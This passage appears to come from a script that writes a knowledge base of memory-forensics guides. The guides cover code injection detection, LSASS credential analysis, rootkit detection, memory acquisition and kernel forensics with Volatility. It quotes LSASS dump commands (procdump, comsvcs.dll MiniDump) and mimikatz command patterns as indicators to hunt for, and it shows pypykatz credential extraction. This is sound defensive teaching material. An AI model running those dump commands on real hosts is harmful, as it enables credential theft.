| Process hollowing | CreateProcess(SUSPENDED) + ZwUnmapViewOfSection + WPM | VadS at image base, hash mismatch |
| Reflective DLL | Custom PE loader (no import) | MZ in VadS private region |
| Atom bombing | GlobalAddAtom + NtQueueApcThread | APC queue artifacts |

## malfind Plugin

```bash
vol.py -f memory.raw windows.malfind
vol.py -f memory.raw windows.malfind --pid 1234
vol.py -f memory.raw windows.malfind --dump   # Dump suspicious regions
```

### Output Interpretation

```
PID: 1234  Process: svchost.exe
Start: 0x3c0000  End: 0x43ffff
Tag: VadS  Protection: PAGE_EXECUTE_READWRITE
Hexdump: 4d 5a 90 00 03 00 ...   ← MZ = injected PE!

MZ header in VadS = injected PE (DLL or EXE)
Shellcode bytes (no MZ) = position-independent code
PAGE_EXECUTE_READ_WRITE in browser = likely JIT (false positive)
```

## VAD Tree Analysis

```bash
vol.py -f memory.raw windows.vadinfo --pid 1234

# Find executable VadS regions:
vol.py -f memory.raw windows.vadinfo --pid 1234 | awk '
/VadS/ { tag=1 }
tag && /EXECUTE/ { print; tag=0 }
'
```

## Process Hollowing — Detailed

```bash
# Step 1: Suspicious command line (no expected args):
vol.py -f memory.raw windows.cmdline | grep svchost
# Legitimate: C:\\Windows\\System32\\svchost.exe -k NetworkService
# Hollowed:   (empty args or wrong path)

# Step 2: Dump executable image:
vol.py -f memory.raw windows.procdump --pid <pid>
sha256sum procdump.<pid>.exe

# Step 3: Hash mismatch vs. known-good confirms hollowing

# Step 4: malfind on PID:
vol.py -f memory.raw windows.malfind --pid <pid>
# May show RWX private at image base (original mapping replaced)
```

## Cobalt Strike Detection in Memory

```bash
vol.py -f memory.raw windows.malfind --pid <pid> --dump
yara cs_beacon.yar dump/pid.*.dmp

# CS config extraction:
python cs-decrypt-beacon.py dump/pid.1234.vad.0x...dmp
```

## Metasploit Meterpreter

```bash
vol.py -f memory.raw windows.malfind | grep -i "metsrv\\|meterpreter"
strings dump/*.dmp | grep -i "metsrv\\|mettle"
vol.py -f memory.raw windows.netscan | grep <pid>
# ESTABLISHED to attacker IP on port 4444 or 443
```

## Injection Finding Report

```
Finding: Code Injection in svchost.exe (PID 1848)

malfind: VAD 0x3c0000-0x43ffff
  Tag: VadS | Protection: PAGE_EXECUTE_READWRITE
  First bytes: 4d 5a (MZ header = injected PE)

procdump hash: abc123...
Expected hash: def456...  → MISMATCH

netscan: PID 1848 ESTABLISHED 185.220.x.x:443

Injected PE YARA: CobaltStrike_Beacon match

Conclusion: Process hollowing with CS beacon in svchost.exe
```
""",
    },
    {
        "title": "Extracting Credentials from Memory — LSASS Analysis, Mimikatz Artifacts",
        "tags": ["credentials", "lsass", "mimikatz", "memory-forensics", "volatility"],
        "content": """# Credential Extraction from Memory

## LSASS Process

`lsass.exe` stores: NT hashes, Kerberos tickets, WDigest plaintext passwords, DPAPI master keys.

```bash
# Verify legitimate LSASS:
vol.py -f memory.raw windows.pstree | grep -i "wininit\\|lsass"
# Should show: wininit.exe → lsass.exe

vol.py -f memory.raw windows.cmdline | grep lsass
# Legitimate: "C:\\Windows\\system32\\lsass.exe"
# Single instance; no unusual arguments
```

## Volatility Credential Plugins

```bash
vol.py -f memory.raw windows.hashdump      # SAM NT/LM hashes
vol.py -f memory.raw windows.cachedump     # Cached domain credentials (DCC2)
vol.py -f memory.raw windows.lsadump       # LSA secrets
```

## pypykatz

```bash
pip install pypykatz

# Dump LSASS PID:
LSASS_PID=$(vol.py -f memory.raw windows.pslist | awk '/lsass/{print $1}')
vol.py -f memory.raw windows.memmap --pid $LSASS_PID --dump

# Analyze:
pypykatz lsa minidump pid.$LSASS_PID.dmp

# Output sections:
# MSV      — NT hashes
# WDigest  — plaintext (if UseLogonCredential=1)
# Kerberos — TGT/TGS tickets
# DPAPI    — master keys
# Credman  — Windows Credential Manager entries
```

## Mimikatz Artifacts in Memory

```bash
# Command lines containing mimikatz syntax:
vol.py -f memory.raw windows.cmdline | grep -i "sekurlsa\\|lsadump\\|privilege::debug"

# YARA scan:
yara -r mimikatz_rules.yar memory.raw

# Handles to LSASS from non-system processes:
vol.py -f memory.raw windows.handles | grep <lsass_pid>
# Non-SYSTEM process with PROCESS_VM_READ on LSASS = credential theft
```

## Common LSASS Dump Methods

```bash
# These appear in cmdline/event logs — look for them:

# 1. ProcDump:
# procdump.exe -ma lsass.exe lsass.dmp

# 2. comsvcs.dll (LOLBin):
# rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <pid> lsass.dmp full

# 3. Task Manager: lsass.dmp in %USERPROFILE%\\AppData\\Local\\Temp\\

vol.py -f memory.raw windows.cmdline | grep -iE "procdump|comsvcs|minidump|lsass"
```

## Kerberos Ticket Analysis

```bash
vol.py -f memory.raw windows.kerberos
# or via pypykatz output

# Golden Ticket: ServiceName = krbtgt, valid for 10 years = attacker-forged
# Silver Ticket: ServiceName = specific service (CIFS/DC01), no domain auth needed
# Kerberoasting: multiple TGS tickets for service accounts (offline cracking)
```

## WDigest Config

```bash
vol.py -f memory.raw windows.registry.printkey \\
    --key "SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest"
# UseLogonCredential = 1 → attacker enabled plaintext passwords
# Normal = 0 or key absent
```
""",
    },
    {
        "title": "Rootkit Detection — SSDT Hooks, DKOM, Hidden Processes",
        "tags": ["rootkit", "ssdt", "dkom", "memory-forensics", "volatility", "dfir"],
        "content": """# Rootkit Detection in Memory

## Rootkit Types

| Type | Level | Persistence Method |
|---|---|---|
| User-mode | Ring 3 | IAT/EAT hooks, DLL injection |
| Kernel-mode | Ring 0 | SSDT hooks, DKOM, IRP hooks |
| Bootkit | Pre-OS | MBR/VBR infection |
| UEFI | Ring -2 | SPI flash modification |

## DKOM Detection

DKOM hides processes by unlinking EPROCESS from `ActiveProcessLinks` — invisible to Task Manager but detectable by pool scanning.

```bash
# pslist (ActiveProcessLinks — manipulable):
vol.py -f memory.raw windows.pslist

# psscan (pool-tag scan — bypasses DKOM):
vol.py -f memory.raw windows.psscan

# Processes in psscan but not pslist = DKOM hidden:
python3 << 'EOF'
import subprocess, re

def pids(plugin):
    out = subprocess.run(["vol.py","-f","memory.raw",f"windows.{plugin}"],
                         capture_output=True, text=True).stdout
    return set(re.findall(r'^(\\d+)', out, re.M))

hidden = pids("psscan") - pids("pslist")
print("DKOM hidden PIDs:", hidden or "None")
EOF
```

## SSDT Hook Detection

```bash
vol.py -f memory.raw windows.ssdt
# Each entry should be within ntoskrnl.exe or win32k.sys
# Any entry pointing outside = hook

# WinDbg SSDT check:
dq nt!KiServiceTable L?100
lm m ntoskrnl   # Get address range
# Compare SSDT entry addresses to ntoskrnl range
```

## IRP Hook Detection

```bash
vol.py -f memory.raw windows.driverirp
# All 28 IRP major handlers should point within the driver's own module
# Handler pointing to different module = IRP hook by rootkit
```

## Hidden Drivers

```bash
vol.py -f memory.raw windows.modules     # ActiveDriverLinks traversal
vol.py -f memory.raw windows.driverscan  # Pool scan for DRIVER_OBJECT

# Drivers in driverscan but not modules = hidden driver
diff <(vol.py -f mem.raw windows.modules | awk '{print $NF}' | sort) \\
     <(vol.py -f mem.raw windows.driverscan | awk '{print $NF}' | sort)
```

## Bootkit Detection

```bash
# Extract MBR (sector 0):
python3 -c "
with open('disk.img','rb') as f:
    mbr = f.read(512)
print(f'MBR sig: {mbr[510:512].hex()}')  # Should be 55aa
print(f'First 8: {mbr[:8].hex()}')
# Known clean MBR: 33 c0 8e d0 ...
"
```

## UEFI Rootkit Analysis

```bash
pip install chipsec
python chipsec_main.py -m tools.uefi.scan_image -a bios.bin

# UEFITool: parse and visualize UEFI firmware modules
# CosmicStrand/MosaicAggressor indicators:
# - Extra modules in DXE phase with no legitimate source
# - Modified EFI modules (checksum mismatch)
# - Unusual SMM handler additions
```

## Full Detection Workflow

```bash
vol.py -f memory.raw windows.pslist  > pslist.txt
vol.py -f memory.raw windows.psscan  > psscan.txt
diff pslist.txt psscan.txt           # Hidden processes

vol.py -f memory.raw windows.ssdt | grep UNKNOWN  # SSDT hooks

vol.py -f memory.raw windows.modules   > modules.txt
vol.py -f memory.raw windows.driverscan > driverscan.txt
diff modules.txt driverscan.txt       # Hidden drivers

vol.py -f memory.raw windows.driverirp | grep -v "\\\\Windows\\\\System32"  # IRP hooks

vol.py -f memory.raw windows.netscan   # Hidden network connections
```
""",
    },
    {
        "title": "Memory Acquisition — WinPmem, LiME, DumpIt",
        "tags": ["memory-acquisition", "winpmem", "lime", "dumpit", "dfir"],
        "content": """# Memory Acquisition

## Why Memory Acquisition Matters

Physical memory contains evidence unavailable on disk: running processes, network connections, decrypted payloads, credentials, and fileless malware. Must be acquired before shutdown.

## Windows

### WinPmem

```bash
winpmem_mini_x64_rc2.exe memory.raw
winpmem_mini_x64_rc2.exe --compress memory.raw.gz
winpmem_mini_x64_rc2.exe \\\\192.168.1.100\\share\\memory.raw  # Direct to network share
winpmem_mini_x64_rc2.exe --hash memory.raw  # SHA256 verification
```

Source: https://github.com/Velocidex/WinPmem (Apache 2.0)

### DumpIt

```
DumpIt.exe /OUTPUT C:\\memory.raw
DumpIt.exe /OUTPUT \\\\server\\share\\memory.raw
# Creates SHA256 hash automatically
```

### FTK Imager

```
File > Capture Memory
Destination: network share or clean external drive
Include pagefile.sys: Yes
```

## Linux

### LiME

```bash
apt install linux-headers-$(uname -r) build-essential
git clone https://github.com/504ensicslabs/lime.git
cd lime/src && make

# Acquire to file:
insmod lime-$(uname -r).ko "path=/tmp/memory.lime format=lime"

# Acquire over network (no disk write on target):
insmod lime.ko "path=tcp:4444 format=lime"
# Receiving workstation:
nc <target_ip> 4444 > memory.lime
```

### avml (Azure/Cloud)

```bash
wget https://github.com/microsoft/avml/releases/latest/download/avml
chmod +x avml
./avml memory.lime
# Supports direct upload to S3/Azure Blob
```

## Chain of Custody Documentation

```
Case: IR-2025-0042
Evidence: Memory image of WORKSTATION-01
Acquired: 2025-03-15 14:32:07 UTC
By: John Smith (IR analyst)

System: Windows 10 22H2, 16 GB RAM
Tool: WinPmem v4.0.rc1
Command: winpmem_mini_x64_rc2.exe --format raw memory.raw
Output: WORKSTATION-01_20250315-143207.raw
Size: 17,179,869,184 bytes
SHA256: abc123...def456

Storage: Evidence drive Seagate 1TB (S/N: XXXXXXXX)
Copy: \\evidence-server\\IR-2025-0042\\

Notes: System active during acquisition. No shutdown performed.
```

## Opening Images in Volatility 3

```bash
vol.py -f memory.raw windows.info     # Raw format (WinPmem, DumpIt)
vol.py -f memory.dmp windows.info     # Crash dump format
vol.py -f memory.lime linux.info      # LiME format (Linux)
```

## Cloud VM Acquisition

```bash
# AWS EC2 via SSM:
aws ssm send-command --document-name AWS-RunPowerShellScript \\
  --targets Key=instanceids,Values=i-1234567890 \\
  --parameters commands=["winpmem.exe C:\\\\memory.raw"]

# VMware ESXi snapshot creates .vmem file (raw memory):
vim-cmd vmsvc/snapshot.create <vmid> "ForensicSnap" "" true true
# .vmem in VM directory = raw memory image
```
""",
    },
    {
        "title": "Volatility Registry Analysis and Network Connection Forensics",
        "tags": ["volatility", "registry", "network-forensics", "memory-forensics"],
        "content": """# Registry and Network Forensics from Memory

## Registry Analysis

### Hive Listing

```bash
vol.py -f memory.raw windows.registry.hivelist
# Shows: Virtual, Physical, Name for all loaded hives
# Key hives: SYSTEM, SOFTWARE, SAM, SECURITY, NTUSER.DAT
```

### Key Extraction

```bash
# Persistence (Run keys):
vol.py -f memory.raw windows.registry.printkey \\
    --key "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"

# Services:
vol.py -f memory.raw windows.registry.printkey \\
    --key "SYSTEM\\\\CurrentControlSet\\\\Services"

# Winlogon (shell/userinit hijacking):
vol.py -f memory.raw windows.registry.printkey \\
    --key "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon"
# Shell should be "explorer.exe", Userinit should be userinit.exe only

# WDigest (plaintext credential caching):
vol.py -f memory.raw windows.registry.printkey \\
    --key "SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest"
# UseLogonCredential = 1 = attacker enabled plaintext storage

# LSA security packages (malicious SSP injection):
vol.py -f memory.raw windows.registry.printkey \\
    --key "SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa"
# SecurityPackages: unexpected entries = malicious SSP DLL

# Recently executed programs:
vol.py -f memory.raw windows.registry.userassist
vol.py -f memory.raw windows.registry.shimcache
```

## Network Connection Analysis

```bash
vol.py -f memory.raw windows.netscan
# Columns: Protocol, LocalAddr, LocalPort, ForeignAddr, ForeignPort, State, PID, Owner

# Established connections:
vol.py -f memory.raw windows.netscan | grep ESTABLISHED

# All unique foreign ports:
vol.py -f memory.raw windows.netscan | awk '{print $6}' | sort -u
# Flag: 4444, 1337, 31337, 8080, 8443 = common RAT/C2 ports

# Connections by PID:
SUSPICIOUS_PID=1848
vol.py -f memory.raw windows.netscan | grep $SUSPICIOUS_PID
```

### Correlating Connections to Processes

```bash
# Full picture for suspicious PID:
vol.py -f memory.raw windows.pstree  | grep $SUSPICIOUS_PID
vol.py -f memory.raw windows.cmdline | grep $SUSPICIOUS_PID
vol.py -f memory.raw windows.dlllist --pid $SUSPICIOUS_PID
vol.py -f memory.raw windows.netscan | grep $SUSPICIOUS_PID
vol.py -f memory.raw windows.malfind --pid $SUSPICIOUS_PID
```

### DNS Cache from Memory

```bash
# DNS cache lives in svchost running dnscache service
DNSCACHE_PID=$(vol.py -f mem.raw windows.pslist | awk '/svchost.*dns/{print $1}' | head -1)
vol.py -f memory.raw windows.memmap --pid $DNSCACHE_PID --dump

strings pid.$DNSCACHE_PID.dmp | grep -E "[a-z0-9.-]{4,}\\.[a-z]{2,6}" | \\
  grep -v "microsoft\\|windows\\|adobe\\|google" | sort -u
```

## Memory Analysis Report Template

```
MEMORY FORENSICS REPORT
Case: IR-2025-0042 | Image: WORKSTATION-01_20250315.raw

EXECUTIVE SUMMARY:
CS beacon injected into svchost.exe (PID 1848),
credential theft via LSASS dump, active C2 to 185.220.101.45.

TIMELINE:
14:02 UTC — Malicious macro: WINWORD.EXE → powershell.exe
14:03 UTC — PowerShell downloaded shellcode
14:04 UTC — Shellcode injected into svchost.exe (PID 1848)
14:05 UTC — LSASS opened with PROCESS_VM_READ by PID 1848
14:06 UTC — C2 beacon: 185.220.101.45:443 ESTABLISHED

FINDINGS:
1. INJECTION: svchost.exe PID 1848 — RWX VadS with MZ header, YARA: CS beacon
2. CREDENTIALS: LSASS handles + pypykatz shows 3 domain account hashes
3. PERSISTENCE: HKCU Run key → C:\\Users\\user\\AppData\\svchost32.exe

ACTIONS:
1. Isolate workstation
2. Reset 3 compromised accounts
3. Block 185.220.101.45 at perimeter
4. Hunt for lateral movement from this host
```
""",
    },
    {
        "title": "Windows Kernel Forensics — Pool Tags, Object Headers, Driver Analysis",
        "tags": ["kernel-forensics", "pool-tags", "drivers", "windbg", "memory-forensics"],
        "content": """# Windows Kernel Forensics

## Pool Memory and Tags

The Windows kernel uses tagged pool allocations. Each allocation has a 4-byte tag identifying its type.

### Common Pool Tags

| Tag | Object | Forensic Use |
|---|---|---|
| `Proc` (0x636F7250) | EPROCESS | Find hidden processes |
| `Thre` | ETHREAD | Thread objects |
| `File` | FILE_OBJECT | Open file handles |
| `Driv` | DRIVER_OBJECT | Loaded drivers |
| `TcpE` | TCP_ENDPOINT | TCP connections |
| `UdpA` | UDP_ENDPOINT | UDP sockets |
| `Mutant` | KMUTANT | Mutex (C2 check-in mutexes) |

### Pool Scanning with Volatility

```bash
vol.py -f memory.raw windows.psscan       # Scan for EPROCESS ('Proc')
vol.py -f memory.raw windows.driverscan   # Scan for DRIVER_OBJECT ('Driv')
vol.py -f memory.raw windows.filescan     # Scan for FILE_OBJECT ('File')
vol.py -f memory.raw windows.mutantscan   # Scan for KMUTANT ('Mutant')
# Cross-ref with pslist/modules to find hidden objects
```

## Object Headers

Every kernel object has an `_OBJECT_HEADER` preceding the body:

```c
typedef struct _OBJECT_HEADER {
    LONG_PTR  PointerCount;
    LONG_PTR  HandleCount;
    UCHAR     TypeIndex;        // Index into ObpObjectTypes[]
    UCHAR     InfoMask;
    UCHAR     Flags;
    PVOID     SecurityDescriptor;
    QUAD      Body;             // Object body follows here
} OBJECT_HEADER;
```

```windbg
!object \\Device\\HarddiskVolume1    ; examine an object
dt _OBJECT_HEADER <address>          ; raw structure dump
dt _EPROCESS <address>               ; process structure
dt _EPROCESS <address> ImageFileName ; specific field only
```

## Driver Analysis

```windbg
!drvobj \\Driver\\suspect full
; Shows: DriverStart, DriverSize, DriverEntry, all 28 IRP handlers

; Suspicious: IRP handler pointing outside driver's own module range
; Legitimate: all handlers within DriverStart to DriverStart+DriverSize
```

```bash
vol.py -f memory.raw windows.driverscan
# Suspicious paths (not C:\\Windows\\System32\\drivers\\*.sys):
vol.py -f memory.raw windows.modules | grep -iv "\\\\windows\\\\system32"

# Dump suspicious driver for Ghidra analysis:
vol.py -f memory.raw windows.dumpfiles --virtaddr <driver_base>
```

## SSDT Analysis

```bash
vol.py -f memory.raw windows.ssdt
# Index, Address, Module, Symbol
# Legitimate: all addresses within ntoskrnl.exe or win32k.sys
# Hooked: address outside both = rootkit intercept

# WinDbg:
dq nt!KiServiceTable L?200   ; dump SSDT
lm m ntoskrnl                 ; get address range for comparison
```

## Detection Workflow

```bash
# 1. Hidden processes
diff <(vol.py -f mem.raw windows.pslist  | awk '{print $1}' | sort) \\
     <(vol.py -f mem.raw windows.psscan  | awk '{print $1}' | sort)

# 2. SSDT hooks
vol.py -f mem.raw windows.ssdt | grep UNKNOWN

# 3. Hidden drivers
diff <(vol.py -f mem.raw windows.modules   | awk '{print $NF}' | sort) \\
     <(vol.py -f mem.raw windows.driverscan| awk '{print $NF}' | sort)

# 4. IRP hooks
vol.py -f mem.raw windows.driverirp | grep -v "\\\\Windows\\\\System32"

# 5. Dump suspicious driver
vol.py -f mem.raw windows.dumpfiles --virtaddr <base>
# Analyze with: die, strings, yara, Ghidra
```
""",
    },
]
''')
print("Collection 3 written.")

print("All 3 collections written. File ready for Collections 4-7.")
